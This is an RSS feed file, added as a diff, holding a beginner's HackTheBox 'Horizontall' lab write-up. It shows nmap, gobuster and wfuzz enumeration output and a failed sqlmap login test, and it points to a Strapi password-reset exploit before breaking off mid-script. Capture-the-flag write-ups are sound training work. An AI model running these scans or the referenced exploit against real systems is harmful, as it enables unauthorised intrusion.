@@ -1,0 +1,461 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>WeaponizedPeach >> Infosec</title><link>https://weaponizedpeach.github.io/</link><description>Recent content on WeaponizedPeach >> Infosec</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sat, 05 Feb 2022 20:55:12 +0200</lastBuildDate><atom:link href="https://weaponizedpeach.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>HackTheBox: Horizontall</title><link>https://weaponizedpeach.github.io/p/hackthebox-horizontall/</link><pubDate>Sat, 05 Feb 2022 20:55:12 +0200</pubDate><guid>https://weaponizedpeach.github.io/p/hackthebox-horizontall/</guid><description>&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 100;
+flex-basis: 240px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/horizontall.png" data-size="300x300">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/horizontall.png"
+width="300"
+height="300"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/horizontall_hucabaac7a6e40d6b25ebdf18177d21d86_71191_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/horizontall_hucabaac7a6e40d6b25ebdf18177d21d86_71191_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Horizontall">
+&lt;/a>
+&lt;figcaption>Horizontall&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;h2 id="intro">Intro&lt;/h2>
+&lt;p>Welcome to my very first writeup! I am just starting out my infosec journey, and this box was my first &amp;lsquo;real&amp;rsquo; challenge. Although it is rated &amp;lsquo;Easy&amp;rsquo;, I had to apply all of my current knowledge to snag both flags. Let&amp;rsquo;s crack straight into it!&lt;/p>
+&lt;h2 id="reconnaissance">Reconnaissance&lt;/h2>
+&lt;p>Machine tags:&lt;/p>
+&lt;ul>
+&lt;li>Linux&lt;/li>
+&lt;li>CMS Exploit&lt;/li>
+&lt;li>Outdated Software&lt;/li>
+&lt;li>CVE&lt;/li>
+&lt;li>Injection&lt;/li>
+&lt;li>RCE&lt;/li>
+&lt;li>Account Misconfiguration&lt;/li>
+&lt;/ul>
+&lt;p>The tags on the machine alone gives us a pretty good idea of what we&amp;rsquo;ll be up against.&lt;/p>
+&lt;h2 id="scanning--discovery">Scanning &amp;amp; Discovery&lt;/h2>
+&lt;h3 id="nmap">nmap&lt;/h3>
+&lt;p>Let&amp;rsquo;s start with a simple &lt;code>nmap&lt;/code> scan:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="c1"># Nmap 7.92 scan initiated Fri Feb 4 15:37:34 2022 as: nmap -sC -sV -O -oA initial_scripts_versions_os 10.10.11.105&lt;/span>
+Nmap scan report &lt;span class="k">for&lt;/span> 10.10.11.105
+Host is up &lt;span class="o">(&lt;/span>0.046s latency&lt;span class="o">)&lt;/span>.
+Not shown: &lt;span class="m">998&lt;/span> closed tcp ports &lt;span class="o">(&lt;/span>reset&lt;span class="o">)&lt;/span>
+PORT STATE SERVICE VERSION
+22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 &lt;span class="o">(&lt;/span>Ubuntu Linux&lt;span class="p">;&lt;/span> protocol 2.0&lt;span class="o">)&lt;/span>
+&lt;span class="p">|&lt;/span> ssh-hostkey:
+&lt;span class="p">|&lt;/span> &lt;span class="m">2048&lt;/span> ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 &lt;span class="o">(&lt;/span>RSA&lt;span class="o">)&lt;/span>
+&lt;span class="p">|&lt;/span> &lt;span class="m">256&lt;/span> 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 &lt;span class="o">(&lt;/span>ECDSA&lt;span class="o">)&lt;/span>
+&lt;span class="p">|&lt;/span>_ &lt;span class="m">256&lt;/span> 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 &lt;span class="o">(&lt;/span>ED25519&lt;span class="o">)&lt;/span>
+80/tcp open http nginx 1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+&lt;span class="p">|&lt;/span>_http-title: Did not follow redirect to http://horizontall.htb
+&lt;span class="p">|&lt;/span>_http-server-header: nginx/1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)&lt;/span>
+No exact OS matches &lt;span class="k">for&lt;/span> host &lt;span class="o">(&lt;/span>If you know what OS is running on it, see https://nmap.org/submit/ &lt;span class="o">)&lt;/span>.
+TCP/IP fingerprint:
+OS:SCAN&lt;span class="o">(&lt;/span>&lt;span class="nv">V&lt;/span>&lt;span class="o">=&lt;/span>7.92%E&lt;span class="o">=&lt;/span>4%D&lt;span class="o">=&lt;/span>2/4%OT&lt;span class="o">=&lt;/span>22%CT&lt;span class="o">=&lt;/span>1%CU&lt;span class="o">=&lt;/span>31967%PV&lt;span class="o">=&lt;/span>Y%DS&lt;span class="o">=&lt;/span>2%DC&lt;span class="o">=&lt;/span>I%G&lt;span class="o">=&lt;/span>Y%TM&lt;span class="o">=&lt;/span>61FD2C35
+OS:%P&lt;span class="o">=&lt;/span>x86_64-pc-linux-gnu&lt;span class="o">)&lt;/span>SEQ&lt;span class="o">(&lt;/span>&lt;span class="nv">SP&lt;/span>&lt;span class="o">=&lt;/span>105%GCD&lt;span class="o">=&lt;/span>1%ISR&lt;span class="o">=&lt;/span>10B%TI&lt;span class="o">=&lt;/span>Z%CI&lt;span class="o">=&lt;/span>Z%II&lt;span class="o">=&lt;/span>I%TS&lt;span class="o">=&lt;/span>A&lt;span class="o">)&lt;/span>OPS&lt;span class="o">(&lt;/span>
+OS:O1&lt;span class="o">=&lt;/span>M505ST11NW7%O2&lt;span class="o">=&lt;/span>M505ST11NW7%O3&lt;span class="o">=&lt;/span>M505NNT11NW7%O4&lt;span class="o">=&lt;/span>M505ST11NW7%O5&lt;span class="o">=&lt;/span>M505ST11
+OS:NW7%O6&lt;span class="o">=&lt;/span>M505ST11&lt;span class="o">)&lt;/span>WIN&lt;span class="o">(&lt;/span>&lt;span class="nv">W1&lt;/span>&lt;span class="o">=&lt;/span>FE88%W2&lt;span class="o">=&lt;/span>FE88%W3&lt;span class="o">=&lt;/span>FE88%W4&lt;span class="o">=&lt;/span>FE88%W5&lt;span class="o">=&lt;/span>FE88%W6&lt;span class="o">=&lt;/span>FE88&lt;span class="o">)&lt;/span>ECN&lt;span class="o">(&lt;/span>
+OS:R&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>FAF0%O&lt;span class="o">=&lt;/span>M505NNSNW7%CC&lt;span class="o">=&lt;/span>Y%Q&lt;span class="o">=)&lt;/span>T1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%S&lt;span class="o">=&lt;/span>O%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AS
+OS:%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T2&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T3&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>N&lt;span class="o">)&lt;/span>T4&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>Z%F&lt;span class="o">=&lt;/span>R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T5&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>
+OS:Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>Z%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AR%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T6&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>A%A&lt;span class="o">=&lt;/span>Z%F&lt;span class="o">=&lt;/span>
+OS:R%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>T7&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>Y%T&lt;span class="o">=&lt;/span>40%W&lt;span class="o">=&lt;/span>0%S&lt;span class="o">=&lt;/span>Z%A&lt;span class="o">=&lt;/span>S+%F&lt;span class="o">=&lt;/span>AR%O&lt;span class="o">=&lt;/span>%RD&lt;span class="o">=&lt;/span>0%Q&lt;span class="o">=)&lt;/span>U1&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DF&lt;span class="o">=&lt;/span>N%T
+OS:&lt;span class="o">=&lt;/span>40%IPL&lt;span class="o">=&lt;/span>164%UN&lt;span class="o">=&lt;/span>0%RIPL&lt;span class="o">=&lt;/span>G%RID&lt;span class="o">=&lt;/span>G%RIPCK&lt;span class="o">=&lt;/span>G%RUCK&lt;span class="o">=&lt;/span>G%RUD&lt;span class="o">=&lt;/span>G&lt;span class="o">)&lt;/span>IE&lt;span class="o">(&lt;/span>&lt;span class="nv">R&lt;/span>&lt;span class="o">=&lt;/span>Y%DFI&lt;span class="o">=&lt;/span>N%T&lt;span class="o">=&lt;/span>40%CD&lt;span class="o">=&lt;/span>
+OS:S&lt;span class="o">)&lt;/span>
+Network Distance: &lt;span class="m">2&lt;/span> hops
+Service Info: OS: Linux&lt;span class="p">;&lt;/span> CPE: cpe:/o:linux:linux_kernel
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Takeaway:&lt;/p>
+&lt;ul>
+&lt;li>&lt;code>nginx&lt;/code> web server running on &lt;code>:80&lt;/code>&lt;/li>
+&lt;li>&lt;code>OpenSSH 7.6p1&lt;/code> SSH server on &lt;code>:22&lt;/code>&lt;/li>
+&lt;li>Ubuntu OS&lt;/li>
+&lt;/ul>
+&lt;p>&lt;code>_http-title: Did not follow redirect to http://horizontall.htb&lt;/code>&lt;/p>
+&lt;p>We can see a redirect to a URL. Let&amp;rsquo;s add it to our /etc/hosts file:&lt;/p>
+&lt;p>&lt;code>sudo echo &amp;quot;10.10.11.105 horizontall.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts&lt;/code>&lt;/p>
+&lt;p>I left an all port scan in the background afterwards, but it did not give any additional results.&lt;/p>
+&lt;h3 id="whatweb">whatweb&lt;/h3>
+&lt;p>Whatweb didn&amp;rsquo;t give us any more information than nmap already did.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">http://horizontall.htb &lt;span class="o">[&lt;/span>&lt;span class="m">200&lt;/span> OK&lt;span class="o">]&lt;/span> Country&lt;span class="o">[&lt;/span>RESERVED&lt;span class="o">][&lt;/span>ZZ&lt;span class="o">]&lt;/span>, HTML5, HTTPServer&lt;span class="o">[&lt;/span>Ubuntu Linux&lt;span class="o">]&lt;/span>
+&lt;span class="o">[&lt;/span>nginx/1.14.0 &lt;span class="o">(&lt;/span>Ubuntu&lt;span class="o">)]&lt;/span>, IP&lt;span class="o">[&lt;/span>10.10.11.105&lt;span class="o">]&lt;/span>, Script, Title&lt;span class="o">[&lt;/span>horizontall&lt;span class="o">]&lt;/span>,
+X-UA-Compatible&lt;span class="o">[&lt;/span>&lt;span class="nv">IE&lt;/span>&lt;span class="o">=&lt;/span>edge&lt;span class="o">]&lt;/span>, nginx&lt;span class="o">[&lt;/span>1.14.0&lt;span class="o">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="horizontallhtb">horizontall.htb&lt;/h3>
+&lt;p>I connected to this URL and was greeted by this:&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 137;
+flex-basis: 328px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing.png" data-size="965x704">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing.png"
+width="965"
+height="704"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/landing_hu13df9e079a959b6c4eb977047883a5f8_78873_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Landing page">
+&lt;/a>
+&lt;figcaption>Landing page&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>Scrolling down, I noticed what seemed like a contact form of some sort:&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 222;
+flex-basis: 534px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form.png" data-size="955x429">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form.png"
+width="955"
+height="429"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/contact_form_huf862caa08a595f9570d016af4eb49880_38915_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Contact form">
+&lt;/a>
+&lt;figcaption>Contact form&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>I did my best attempt at an XSS script, but after writing it I noticed that the &amp;ldquo;Send&amp;rdquo; button has no JS attached to it. So this attack surface, at least, was not likely.&lt;/p>
+&lt;p>Next, I decided to try and brute-force some hidden files and directories with gobuster.&lt;/p>
+&lt;h3 id="gobuster--horizontallhtb">gobuster @ horizontall.htb&lt;/h3>
+&lt;p>I did a quick peek with the dirb/big.txt wordlist, but did not find anything of interest:&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="o">===============================================================&lt;/span>
+Gobuster v3.1.0
+by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://horizontall.htb
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/dirb/big.txt
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.1.0
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Extensions: conf,php,txt,asp,aspx
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+2022/02/04 16:14:11 Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+/css &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/css/&lt;span class="o">]&lt;/span>
+/favicon.ico &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 4286&lt;span class="o">]&lt;/span>
+/img &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/img/&lt;span class="o">]&lt;/span>
+/js &lt;span class="o">(&lt;/span>Status: 301&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 194&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>--&amp;gt; http://horizontall.htb/js/&lt;span class="o">]&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+2022/02/04 16:28:50 &lt;span class="nv">Finished&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>I pondered running a larger wordlist, but decided to check out the SSH service before coming back for a second try.&lt;/p>
+&lt;h3 id="ssh-service-rabbit-hole">SSH Service (rabbit hole)&lt;/h3>
+&lt;p>What caught my eye after the nmap scan, was the &lt;code>OpenSSH 7.6p1&lt;/code> version of the SSH service. A quick search on &lt;code>exploit-db.com&lt;/code> found multiple possible vulnerabilities. What solidified my belief, was the &lt;code>CVE 2018-15473&lt;/code> exploit named &lt;a class="link" href="https://www.exploit-db.com/exploits/45233" target="_blank" rel="noopener"
+>OpenSSH 2.3 &amp;lt; 7.7 - Username Enumeration&lt;/a>. It seemed as though the box&amp;rsquo;s version was succeptible. After attempting both manually running the scripts on &lt;code>exploit-db.com&lt;/code> as well as trying them out automatically via Metasploit, I realized that the server does not leak existing usernames. Rather, it reports all usernames as valid.&lt;/p>
+&lt;p>As such, using a brute-force or dictionary attack via Hydra or something similar was also something I closed the book on.&lt;/p>
+&lt;p>Although, the machine had the tag &amp;ldquo;CMS&amp;rdquo;, however we only ever saw a landing page. Is there something we missed? Where is this CMS?&lt;/p>
+&lt;h3 id="wfuzz-subdomains">wfuzz subdomains&lt;/h3>
+&lt;p>With nowhere else to go, I tried to enumerate possible subdomains. I used the amazing &lt;code>subdomains-top1million-110000.txt&lt;/code> wordlist from the &lt;a class="link" href="https://github.com/danielmiessler/SecLists" target="_blank" rel="noopener"
+>SecLists repository&lt;/a> that I very much recommend.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">wfuzz -c -f subdomains -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u &lt;span class="s1">&amp;#39;http://horizontall.htb&amp;#39;&lt;/span> -H &lt;span class="s2">&amp;#34;Host: FUZZ.horizontall.htb&amp;#34;&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>We found &lt;strong>one&lt;/strong> subdomain out of the ~114000 -&amp;gt; &lt;code>api-prod&lt;/code>&lt;/p>
+&lt;p>Let&amp;rsquo;s quickly add it to our hosts file and check it out!&lt;/p>
+&lt;p>&lt;code>sudo echo &amp;quot;10.10.11.105 api-prod.horizontall.htb&amp;quot; &amp;gt;&amp;gt; /etc/hosts&lt;/code>&lt;/p>
+&lt;h3 id="api-prodhorizontallhtb">api-prod.horizontall.htb&lt;/h3>
+&lt;p>Upon connecting, I was greeted with a very underwhelming screen:&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 356;
+flex-basis: 855px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod.png" data-size="456x128">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod.png"
+width="456"
+height="128"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/api-prod_hua3cdf2001a59290f7ff6a7ec50db8ba4_3378_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="api-prod.horizontall.htb">
+&lt;/a>
+&lt;figcaption>api-prod.horizontall.htb&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>The source code did not give any particularly interesting leads, and so, I went for another gobuster run.&lt;/p>
+&lt;h3 id="gobuster--api-prodhorizontallhtb">gobuster @ api-prod.horizontall.htb&lt;/h3>
+&lt;p>Looking for clues, I started another gobuster run, this time with a much larger wordlist, just in case, &lt;code>directory-list-2.3-big.txt&lt;/code> from the aforementioned SecLists repo.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="o">===============================================================&lt;/span>
+Gobuster v3.1.0
+by OJ Reeves &lt;span class="o">(&lt;/span>@TheColonial&lt;span class="o">)&lt;/span> &lt;span class="p">&amp;amp;&lt;/span> Christian Mehlmauer &lt;span class="o">(&lt;/span>@firefart&lt;span class="o">)&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Url: http://api-prod.horizontall.htb/
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Method: GET
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Threads: &lt;span class="m">10&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Negative Status codes: &lt;span class="m">404&lt;/span>
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> User Agent: gobuster/3.1.0
+&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> Timeout: &lt;span class="nv">10s&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+2022/02/04 17:17:09 Starting gobuster in directory enumeration &lt;span class="nv">mode&lt;/span>
+&lt;span class="o">===============================================================&lt;/span>
+/reviews &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 507&lt;span class="o">]&lt;/span>
+/users &lt;span class="o">(&lt;/span>Status: 403&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 60&lt;span class="o">]&lt;/span>
+/admin &lt;span class="o">(&lt;/span>Status: 200&lt;span class="o">)&lt;/span> &lt;span class="o">[&lt;/span>Size: 854&lt;span class="o">]&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>Very quickly, I found some hidden directories and went to check them out.&lt;/p>
+&lt;h3 id="api-prodhorizontallhtbreviews">api-prod.horizontall.htb/reviews&lt;/h3>
+&lt;p>Even though I was barred from checking out the much more interesting &lt;code>/users&lt;/code> endpoint, I wanted to see what &lt;code>/reviews&lt;/code> had in store also. Unfortunately, it wasn&amp;rsquo;t anything noteworthy, apart from a few usernames. They seemed more like customers than anything resembling a privileged user on the system, so I disregarded this lead as a red herring.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 121;
+flex-basis: 292px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews.png" data-size="604x496">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews.png"
+width="604"
+height="496"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/reviews_hu89e081d61b3e6a8feac03d2140d4bf28_41878_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Reviews">
+&lt;/a>
+&lt;figcaption>Reviews&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>&lt;code>/admin&lt;/code> seemed like the juiciest bit anyway, so let&amp;rsquo;s go there.&lt;/p>
+&lt;h3 id="api-prodhorizontallhtbadmin">api-prod.horizontall.htb/admin&lt;/h3>
+&lt;p>My hopes were reignited when I saw this login screen.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 150;
+flex-basis: 361px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel.png" data-size="777x516">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel.png"
+width="777"
+height="516"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/admin_panel_hu0d412b9a24d6310f2d63d8bf439d19a6_19667_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Strapi CMS Admin Log-in">
+&lt;/a>
+&lt;figcaption>Strapi CMS Admin Log-in&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>Trying out a few commonly used passwords did not prove fruitful. Neither did the &amp;ldquo;Forgot your password?&amp;rdquo; screen.&lt;/p>
+&lt;p>&lt;figure
+class="gallery-image"
+style="
+flex-grow: 124;
+flex-basis: 299px"
+>
+&lt;a href="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password.png" data-size="519x416">
+&lt;img src="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password.png"
+width="519"
+height="416"
+srcset="https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_480x0_resize_box_3.png 480w, https://weaponizedpeach.github.io/p/hackthebox-horizontall/forgot_password_hu2c5b1067b373ff8e4e87998142086112_17208_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Strapi CMS &amp;lsquo;Forgot your password?&amp;#39;">
+&lt;/a>
+&lt;figcaption>Strapi CMS ‘Forgot your password?'&lt;/figcaption>
+&lt;/figure>&lt;/p>
+&lt;p>A search on &lt;code>exploit-db.com&lt;/code> for &lt;code>strapi CMS&lt;/code> returned three possible vulnerabilities - an unauthenticated password reset and two RCEs, one requiring authentication and one not. However, I did not know the version of Strapi used here. I was unsure whether or not the exploits would work.&lt;/p>
+&lt;p>Before trying them out, since this is a log-in screen after all, SQL injection sprung into my mind. I booted up Burp Suite and sqlmap.&lt;/p>
+&lt;h2 id="exploitation">Exploitation&lt;/h2>
+&lt;h3 id="sqlmap-with-burp-suite-rabbit-hole">sqlmap with Burp Suite (rabbit hole)&lt;/h3>
+&lt;p>I saved a random login request with Burp for use with sqlmap:&lt;/p>
+&lt;pre tabindex="0">&lt;code>POST /admin/auth/local HTTP/1.1
+Host: api-prod.horizontall.htb
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://api-prod.horizontall.htb/admin/auth/login
+Content-Type: application/json
+Origin: http://api-prod.horizontall.htb
+Content-Length: 44
+DNT: 1
+Connection: close
+{&amp;quot;identifier&amp;quot;:&amp;quot;admin&amp;quot;,&amp;quot;password&amp;quot;:&amp;quot;password&amp;quot;}
+&lt;/code>&lt;/pre>&lt;p>However, sqlmap wasn&amp;rsquo;t successful neither with the &lt;code>identifier&lt;/code>, nor the &lt;code>password&lt;/code> field.&lt;/p>
+&lt;p>Welp, time to try out that password reset and those RCEs.&lt;/p>
+&lt;h3 id="set-password-unauthenticated">Set Password (Unauthenticated)&lt;/h3>
+&lt;p>First of all, I tried &lt;a class="link" href="https://www.exploit-db.com/exploits/50237" target="_blank" rel="noopener"
+>the password reset exploit&lt;/a> (CVE 2019-18818). My reasoning was to try this first, and the RCE exploits after, specifically, the one that requires authentication, I thought it might have a higher chance of success than the one not needing authentication.&lt;/p>
+&lt;p>Unfortunately, the exploit&amp;rsquo;s Python script did not work correctly out of the box, I was hit by an error regarding the json package used. Not wanting to mess around with installing a different version of Python or reinstalling different packages, I skimmed through the code and found a point of interest.&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python"> &lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;[*] Password reset for user: &lt;/span>&lt;span class="si">{}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">userEmail&lt;/span>&lt;span class="p">))&lt;/span>
